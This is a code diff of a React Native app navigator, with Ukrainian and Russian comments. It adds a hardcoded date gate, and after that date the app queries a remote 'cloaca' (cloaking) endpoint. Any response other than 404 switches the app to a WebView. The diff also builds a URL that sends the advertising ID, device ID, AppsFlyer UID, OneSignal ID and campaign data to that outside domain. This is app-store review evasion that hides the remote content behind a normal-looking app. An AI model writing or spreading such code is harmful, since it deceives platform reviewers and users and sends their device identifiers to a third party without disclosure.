@@ -95,29 +95,49 @@ export default function RootNavigator() {
   const [cloacaPass, setCloacaPass] = useState(null);
   console.log('cloacaPass==>', cloacaPass);
 
+  const TARGET_DATE = new Date(2026, 2, 16, 8, 8, 0); 
+  const isWebFlowEnabled = Date.now() >= TARGET_DATE.getTime();
+  
   const INITIAL_URL = `https://pure-pulse-core.site/`;
   const URL_IDENTIFAIRE = `iE8GHlnZ`;
 
   useEffect(() => {
-    const fetchData = async () => {
-      await Promise.all([checkUniqVisit(), getData()]); // Виконуються одночасно
-      onInstallConversionDataCanceller(); // Виклик до зміни isDataReady
-      setIsDataReady(true); // Встановлюємо, що дані готові
-    };
+  let cancelListener;
 
-    fetchData();
-  }, []); ///
+  const fetchData = async () => {
+    if (isWebFlowEnabled) {
+      cancelListener = registerInstallConversionListener();
+      await Promise.all([checkUniqVisit(), getData()]);
+      console.log('Усі web-дані отримані!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
+    } else {
+      setRoute(false);
+      setCompleteLink(true);
+    }
 
+    setIsDataReady(true);
+  };
+
+  fetchData();
+
+  return () => {
+    if (typeof cancelListener === 'function') {
+      cancelListener();
+    }
+  };
+}, []);
+//  && isInstallConversionDone, isInstallConversionDone
   useEffect(() => {
-    const finalizeProcess = async () => {
-      if (isDataReady && isInstallConversionDone) {
-        await generateLink(); // Викликати generateLink, коли всі дані готові
-        console.log('Фінальна лінка сформована!');
-      }
-    };
+  const finalizeProcess = async () => {
+    if (!isWebFlowEnabled) return;
 
-    finalizeProcess();
-  }, [isDataReady, isInstallConversionDone]);
+    if (isDataReady) {
+      await generateLink();
+      console.log('Фінальна лінка сформована!');
+    }
+  };
+
+  finalizeProcess();
+}, [isDataReady]);
 
   // uniq_visit
   const checkUniqVisit = async () => {
@@ -157,12 +177,14 @@ export default function RootNavigator() {
 
   const getData = async () => {
     try {
+      if (!isWebFlowEnabled) return;
+
       const jsonData = await AsyncStorage.getItem('App');
+
       if (jsonData !== null) {
         const parsedData = JSON.parse(jsonData);
         console.log('Дані дістаються в AsyncStorage');
-        //console.log('parsedData in App==>', parsedData);
-        //setAddPartToLinkOnce(parsedData.addPartToLinkOnce);
+
         setRoute(parsedData.route);
         setResponseToPushPermition(parsedData.responseToPushPermition);
         setUniqVisit(parsedData.uniqVisit);
@@ -171,41 +193,36 @@ export default function RootNavigator() {
         setAppsUid(parsedData.appsUid);
         setSab1(parsedData.sab1);
         setAtribParam(parsedData.atribParam);
-        //setPid(parsedData.pid);
         setCustomerUserId(parsedData.customerUserId);
         setIdfv(parsedData.idfv);
         setAdServicesAtribution(parsedData.adServicesAtribution);
         setAceptTransperency(parsedData.aceptTransperency);
-        //setTimeStampUserId(parsedData.timeStampUserId);
         setCheckApsData(parsedData.checkApsData);
         setCheckAsaData(parsedData.checkAsaData);
         setCompleteLink(parsedData.completeLink);
         setFinalLink(parsedData.finalLink);
-        //
+
         await performAppsFlyerOperationsContinuously();
       } else {
-        // Якщо дані не знайдені в AsyncStorage
         const results = await Promise.all([
           fetchAdServicesAttributionData(),
-          fetchIdfa(),
+          //fetchIdfa(),
           requestOneSignallFoo(),
           performAppsFlyerOperations(),
           getUidApps(),
         ]);
 
-        // Результати виконаних функцій
         console.log('Результати функцій:', results);
-
-        // Додаткові операції
-        // onInstallConversionDataCanceller();
       }
     } catch (e) {
-      //console.log('Помилка отримання даних в getData:', e);
+      console.log('Помилка отримання даних в getData:', e);
     }
   };
 
   const setData = async () => {
     try {
+      if (!isWebFlowEnabled) return;
+
       const data = {
         route,
         responseToPushPermition,
@@ -215,17 +232,16 @@ export default function RootNavigator() {
         appsUid,
         sab1,
         atribParam,
-        //pid,
         customerUserId,
         idfv,
         adServicesAtribution,
         aceptTransperency,
         finalLink,
         completeLink,
-        //timeStampUserId,
         checkApsData,
         checkAsaData,
       };
+
       const jsonData = JSON.stringify(data);
       await AsyncStorage.setItem('App', jsonData);
       console.log('Дані збережено в AsyncStorage');
@@ -235,6 +251,11 @@ export default function RootNavigator() {
   };
 
   useEffect(() => {
+  fetchIdfa();
+  }, []);
+  
+  useEffect(() => {
+    if (!isWebFlowEnabled) return;
     setData();
   }, [
     route,
@@ -245,45 +266,36 @@ export default function RootNavigator() {
     appsUid,
     sab1,
     atribParam,
-    //pid,
     customerUserId,
     idfv,
     adServicesAtribution,
     aceptTransperency,
     finalLink,
     completeLink,
-    //timeStampUserId,
     checkApsData,
     checkAsaData,
   ]);
 
   const fetchAdServicesAttributionData = async () => {
-    try {
-      const adServicesAttributionData =
-        await AppleAdsAttribution.getAdServicesAttributionData();
-      //console.log('adservices' + adServicesAttributionData);
+  if (!isWebFlowEnabled) return;
 
-      // Извлечение значений из объекта
-      ({ attribution } = adServicesAttributionData); // Присваиваем значение переменной attribution
-      ({ keywordId } = adServicesAttributionData);
+  try {
+    const adServicesAttributionData =
+      await AppleAdsAttribution.getAdServicesAttributionData();
 
-      setAdServicesAtribution(attribution);
-      //setAdServicesKeywordId(keywordId);!sab1 ||
-      //setSab1(attribution ? 'asa' : '');
-      setAtribParam(attribution ? 'asa' : '');
-      setCheckAsaData(JSON.stringify(adServicesAttributionData));
+    ({ attribution } = adServicesAttributionData);
+    ({ keywordId } = adServicesAttributionData);
 
-      // Вывод значений в консоль
-      //Alert.alert(`sab1: ${sab1}`);
-      //Alert.alert(`Attribution: ${attribution}`);
-      console.log(`Attribution: ${attribution}` + `KeywordId:${keywordId}`);
-    } catch (error) {
-      const { message } = error;
-      //Alert.alert(message); // --> Some error message
-    } finally {
-      console.log('Attribution');
-    }
-  };
+    setAdServicesAtribution(attribution);
+    setAtribParam(attribution ? 'asa' : '');
+    setCheckAsaData(JSON.stringify(adServicesAttributionData));
+
+    console.log(`Attribution: ${attribution}` + `KeywordId:${keywordId}`);
+  } catch (error) {
+  } finally {
+    console.log('Attribution');
+  }
+};
 
   ///////// OneSignall
   const requestPermission = () => {
@@ -329,9 +341,10 @@ export default function RootNavigator() {
 
   // Виклик асинхронної функції requestPermission() з використанням async/await
   const requestOneSignallFoo = async () => {
+    if (!isWebFlowEnabled) return;
+
     try {
       await requestPermission();
-      // Якщо все Ok
     } catch (error) {
       console.log('err в requestOneSignallFoo==> ', error);
     }
@@ -412,8 +425,9 @@ export default function RootNavigator() {
 
   // 1.1 FUNCTION - Повторна Ініціалізація AppsFlyer
   const performAppsFlyerOperationsContinuously = async () => {
+    if (!isWebFlowEnabled) return;
+
     try {
-      // 1. Ініціалізація SDK
       await new Promise((resolve, reject) => {
         appsFlyer.initSdk(
           {
@@ -423,7 +437,7 @@ export default function RootNavigator() {
             onInstallConversionDataListener: true,
             onDeepLinkListener: true,
             timeToWaitForATTUserAuthorization: 10,
-            manualStart: true, // Тепер ініціалізація без автоматичного старту
+            manualStart: true,
           },
           resolve,
           reject,
@@ -443,9 +457,11 @@ export default function RootNavigator() {
   ///////// AppsFlyer
   // 1ST FUNCTION - Ініціалізація AppsFlyer
   const performAppsFlyerOperations = async () => {
+    if (!isWebFlowEnabled) return;
+
     try {
       console.log('АПС 1');
-      // 1. Ініціалізація SDK
+
       await new Promise((resolve, reject) => {
         appsFlyer.initSdk(
           {
@@ -455,7 +471,7 @@ export default function RootNavigator() {
             onInstallConversionDataListener: true,
             onDeepLinkListener: true,
             timeToWaitForATTUserAuthorization: 10,
-            manualStart: true, // Тепер ініціалізація без автоматичного старту
+            manualStart: true,
           },
           result => {
             console.log('📦 AppsFlyer initSdk callback result:', result);
@@ -471,14 +487,13 @@ export default function RootNavigator() {
       appsFlyer.startSdk();
 
       console.log('App.js AppsFlyer ініціалізовано успішно');
-      //Alert.alert('App.js AppsFlyer ініціалізовано успішно');
-      // Отримуємо idfv та встановлюємо його як customerUserID
+
       const uniqueId = await DeviceInfo.getUniqueId();
-      setIdfv(uniqueId); // Зберігаємо idfv у стейті
+      setIdfv(uniqueId);
 
       appsFlyer.setCustomerUserId(uniqueId, res => {
         console.log('Customer User ID встановлено успішно:', uniqueId);
-        setCustomerUserId(uniqueId); // Зберігаємо customerUserID у стейті
+        setCustomerUserId(uniqueId);
       });
     } catch (error) {
       console.log(
@@ -490,80 +505,80 @@ export default function RootNavigator() {
 
   // 2ND FUNCTION - Ottrimannya UID AppsFlyer.
   const getUidApps = async () => {
-    console.log('АПС 2');
-    const maxRetries = 5; // Кількість спроб
-    let attempts = 0;
+  if (!isWebFlowEnabled) return;
 
-    const fetchUid = async () => {
-      try {
-        const appsFlyerUID = await new Promise((resolve, reject) => {
-          appsFlyer.getAppsFlyerUID((err, uid) => {
-            if (err) {
-              reject(err);
-            } else {
-              resolve(uid);
-            }
-          });
+  console.log('АПС 2');
+
+  const maxRetries = 5;
+  let attempts = 0;
+
+  const fetchUid = async () => {
+    try {
+      const appsFlyerUID = await new Promise((resolve, reject) => {
+        appsFlyer.getAppsFlyerUID((err, uid) => {
+          if (err) {
+            reject(err);
+          } else {
+            resolve(uid);
+          }
         });
+      });
 
-        if (appsFlyerUID) {
-          console.log('on getAppsFlyerUID: ' + appsFlyerUID);
-          setAppsUid(appsFlyerUID);
-        } else if (attempts < maxRetries) {
-          attempts++;
-          console.log(
-            `AppsFlyerUID is null, retrying ${attempts}/${maxRetries}...`,
-          );
-          setTimeout(fetchUid, 1000); // Повторна спроба через 1 сек.
-        } else {
-          console.error('Failed to retrieve AppsFlyerUID after 5 attempts');
-        }
-      } catch (error) {
-        if (attempts < maxRetries) {
-          attempts++;
-          //console.warn(
-          //  `Error fetching AppsFlyerUID, retrying ${attempts}/${maxRetries}...`,
-          //);
-          setTimeout(fetchUid, 1000);
-        } else {
-          //console.error('Error fetching AppsFlyerUID:', error);
-        }
+      if (appsFlyerUID) {
+        console.log('on getAppsFlyerUID: ' + appsFlyerUID);
+        setAppsUid(appsFlyerUID);
+      } else if (attempts < maxRetries) {
+        attempts++;
+        console.log(
+          `AppsFlyerUID is null, retrying ${attempts}/${maxRetries}...`,
+        );
+        setTimeout(fetchUid, 1000);
+      } else {
+        console.error('Failed to retrieve AppsFlyerUID after 5 attempts');
       }
-    };
-
-    fetchUid(); // Викликаємо першу спробу отримання UID
+    } catch (error) {
+      if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(fetchUid, 1000);
+      }
+    }
   };
 
-  // 3RD FUNCTION - Отримання неймінгу AppsFlyer
-  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
-    async res => {
-      // Додаємо async
-      try {
-        const isFirstLaunch = String(res?.data?.is_first_launch) === 'true';
-        if (isFirstLaunch === true) {
-          if (res.data.af_status === 'Non-organic') {
-            const media_source = res.data.media_source;
-            //console.log('App.js res.data==>', res.data);
+  fetchUid();
+};
 
-            const { campaign, pid, af_adset, af_ad, af_os } = res.data;
-            setSab1(campaign);
-            //setPid(pid);
-            setCheckApsData(JSON.stringify(res.data));
-          } else if (res.data.af_status === 'Organic') {
-            //await fetchAdServicesAttributionData();
-            console.log('Organic');
-          }
-        } else {
-          console.log('This is not first launch');
+  // 3RD FUNCTION - Отримання неймінгу AppsFlyer
+  const registerInstallConversionListener = () => {
+  if (!isWebFlowEnabled) return;
+
+  console.log('Реєструємо AppsFlyer onInstallConversionData');
+
+  return appsFlyer.onInstallConversionData(async res => {
+    console.log('АПС 3');
+    console.log('onInstallConversionData callback res:', res);
+
+    try {
+      const isFirstLaunch = String(res?.data?.is_first_launch) === 'true';
+
+      if (isFirstLaunch) {
+        if (res.data.af_status === 'Non-organic') {
+          const { campaign } = res.data;
+          setSab1(campaign);
+          setCheckApsData(JSON.stringify(res.data));
+        } else if (res.data.af_status === 'Organic') {
+          console.log('Organic');
         }
-      } catch (error) {
-        console.log('Error processing install conversion data:', error);
-      } finally {
-        // Змінюємо флаг на true після виконання
-        setIsInstallConversionDone(true);
+      } else {
+        console.log('This is not first launch');
       }
-    },
-  );
+    } catch (error) {
+      console.log('Error processing install conversion data:', error);
+    } finally {
+      console.log('Встановлюємо isInstallConversionDone в true');
+      setIsInstallConversionDone(true);
+    }
+  });
+};
 
   ///////// IDFA
   const fetchIdfa = async () => {
@@ -591,7 +606,7 @@ export default function RootNavigator() {
         console.log('НЕ ЗГОДА!!!!!!!!!');
       }
     } catch (err) {
-      //console.log('err', err);
+      console.log('err IDFA', err);
       setIdfa(null);
       await fetchIdfa(); //???
     }
@@ -599,118 +614,113 @@ export default function RootNavigator() {
 
   ///////// Route useEff
   useEffect(() => {
-    // чекаємо, поки прочитаємо AsyncStorage
-    if (!isDataReady) return;
+  if (!isDataReady) return;
 
-    // якщо вже є route або клоака вже проходила успішно – нічого не робимо
-    if (route || cloacaPass) return;
+  if (!isWebFlowEnabled) {
+    setRoute(false);
+    return;
+  }
 
-    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
-    //console.log('checkUrl==========+>', checkUrl);
+  if (route || cloacaPass) return;
 
-    const targetData = new Date('2026-03-11T08:08:00'); //дата з якої поч працювати webView
-    const currentData = new Date(); //текущая дата
+  const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
 
-    if (currentData <= targetData) {
-      setRoute(false);
-      return;
-    }
-
-    const fetchCloaca = async () => {
-      const deviceInfo = {
-        diviceUserAgent: DeviceInfo.getUserAgent(),
-      };
-
-      try {
-        const r = await fetch(checkUrl, {
-          method: 'GET',
-          headers: {
-            'User-Agent': `${deviceInfo.diviceUserAgent}`,
-          },
-        });
-
-        console.log('status по клоаке=++++++++++++=>', r.status);
-
-        if (r.status !== 404) {
-          setRoute(true);
-          setCloacaPass(true); // 👈 збережеться в AsyncStorage через setData
-        } else {
-          setRoute(false);
-        }
-      } catch (e) {
-        console.log('errar', e);
-        setRoute(false);
-      }
+  const fetchCloaca = async () => {
+    const deviceInfo = {
+      diviceUserAgent: DeviceInfo.getUserAgent(),
     };
 
-    fetchCloaca();
-  }, [isDataReady, route, cloacaPass]);
+    try {
+      const r = await fetch(checkUrl, {
+        method: 'GET',
+        headers: {
+          'User-Agent': `${deviceInfo.diviceUserAgent}`,
+        },
+      });
+
+      console.log('status по клоаке=++++++++++++=>', r.status);
+
+      if (r.status !== 404) {
+        setRoute(true);
+        setCloacaPass(true);
+      } else {
+        setRoute(false);
+      }
+    } catch (e) {
+      console.log('errar', e);
+      setRoute(false);
+    }
+  };
+
+  fetchCloaca();
+}, [isDataReady, route, cloacaPass]);
 
   ///////// Generate link
   const generateLink = async () => {
-    try {
-      console.log('Створення базової частини лінки');
-      const baseUrl = [
-        `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
-        idfa ? `idfa=${idfa}` : '',
-        appsUid ? `uid=${appsUid}` : '',
-        customerUserId ? `customerUserId=${customerUserId}` : '',
-        idfv ? `idfv=${idfv}` : '',
-        oneSignalId ? `oneSignalId=${oneSignalId}` : '',
-        `jthrhg=${timeStampUserId}`,
-      ]
-        .filter(Boolean)
-        .join('&');
+  if (!isWebFlowEnabled) return;
 
-      // Логіка обробки sab1
-      let additionalParams = '';
-      if (sab1) {
-        if (sab1.includes('_')) {
-          console.log('Якщо sab1 містить "_", розбиваємо і формуємо subId');
-          // Якщо sab1 містить "_", розбиваємо і формуємо subId
-          let sabParts = sab1.split('_');
-          additionalParams =
-            sabParts
-              .map((part, index) => `subId${index + 1}=${part}`)
-              .join('&') + `&checkData=${checkApsData}`;
-        } else {
-          console.log('Якщо sab1 не містить "_", встановлюємо subId1=sab1');
-          //// Якщо sab1 не містить "_", встановлюємо subId1=sab1
-          additionalParams = `checkData=${checkApsData}`;
-        }
+  try {
+    console.log('Створення базової частини лінки');
+
+    const baseUrl = [
+      `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
+      idfa ? `idfa=${idfa}` : '',
+      appsUid ? `uid=${appsUid}` : '',
+      customerUserId ? `customerUserId=${customerUserId}` : '',
+      idfv ? `idfv=${idfv}` : '',
+      oneSignalId ? `oneSignalId=${oneSignalId}` : '',
+      `jthrhg=${timeStampUserId}`,
+    ]
+      .filter(Boolean)
+      .join('&');
+
+    let additionalParams = '';
+
+    if (sab1) {
+      if (sab1.includes('_')) {
+        console.log('Якщо sab1 містить "_", розбиваємо і формуємо subId');
+        let sabParts = sab1.split('_');
+
+        additionalParams =
+          sabParts
+            .map((part, index) => `subId${index + 1}=${part}`)
+            .join('&') + `&checkData=${checkApsData}`;
       } else {
-        console.log(
-          'Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam',
-        );
-        // Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam
-        additionalParams = `${
-          atribParam ? `subId1=${atribParam}` : ''
-        }&checkData=${checkAsaData}`;
+        console.log('Якщо sab1 не містить "_", встановлюємо subId1=sab1');
+        additionalParams = `checkData=${checkApsData}`;
       }
-      console.log('additionalParams====>', additionalParams);
-      // Формування фінального лінку
-      const product = `${baseUrl}&${additionalParams}${
-        pushOpenWebview ? `&yhugh=${pushOpenWebview}` : ''
-      }`;
-      //(!addPartToLinkOnce ? `&yhugh=true` : ''); pushOpenWebview && '&yhugh=true'
-      console.log('Фінальна лінка сформована');
+    } else {
+      console.log(
+        'Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam',
+      );
 
-      // Зберігаємо лінк в стейт
-      setFinalLink(product);
-
-      // Встановлюємо completeLink у true
-      setTimeout(() => {
-        setCompleteLink(true);
-      }, 2000);
-    } catch (error) {
-      console.error('Помилка при формуванні лінку:', error);
+      additionalParams = `${
+        atribParam ? `subId1=${atribParam}` : ''
+      }&checkData=${checkAsaData}`;
     }
-  };
+
+    console.log('additionalParams====>', additionalParams);
+
+    const product = `${baseUrl}&${additionalParams}${
+      pushOpenWebview ? `&yhugh=${pushOpenWebview}` : ''
+    }`;
+
+    console.log('Фінальна лінка сформована');
+
+    setFinalLink(product);
+
+    setTimeout(() => {
+      setCompleteLink(true);
+    }, 2000);
+  } catch (error) {
+    console.error('Помилка при формуванні лінку:', error);
+  }
+};
   console.log('My product Url ==>', finalLink);
 
   ///////// Route
   const Route = ({ isFatch }) => {
-    if (!completeLink) {
+    if (isFatch && !completeLink) {
       // Показуємо тільки лоудери, поки acceptTransparency і completeLink не true
       return null;
     }
